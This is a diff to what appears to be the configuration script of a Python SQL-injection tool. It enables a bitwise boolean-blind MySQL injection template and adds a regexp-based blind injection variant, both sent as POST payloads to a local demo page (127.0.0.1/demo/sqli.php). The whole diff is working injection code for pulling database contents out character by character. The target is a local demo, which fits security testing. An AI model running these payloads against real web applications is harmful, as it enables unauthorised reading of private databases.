@@ -88,10 +88,23 @@ def mysql_boolean():
       encode_payload = quote,
       )
 
-  #template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
-  #return Method_bitwise(make_requester, template)
+  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
+  return Method_bitwise(make_requester, template)
 
-  template = " and (${query}) regexp binary '${regexp}'"
+def mysql_boolean_regexp():
+
+  def make_requester():
+    return Requester_HTTP(
+      proxies = PROXIES,
+      headers = HEADERS,
+      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
+      body = 'id=1${injection}',
+      method = 'POST',
+      response_processor = test_state_grep,
+      encode_payload = quote,
+      )
+
+  template = ' and (${query}) regexp binary ${regexp}'
   return Method_regexp(make_requester, template)
 
 def mysql_time():
@@ -259,6 +272,7 @@ def oracle_boolean():
 #sqli = MySQL_Inband(mysql_union())
 #sqli = MySQL_Inband(mysql_error())
 sqli = MySQL_Blind(mysql_boolean())
+#sqli = MySQL_Blind(mysql_boolean_regexp())
 #sqli = MySQL_Blind(mysql_time())
 
 #sqli = MSSQL_Inband(mssql_union())
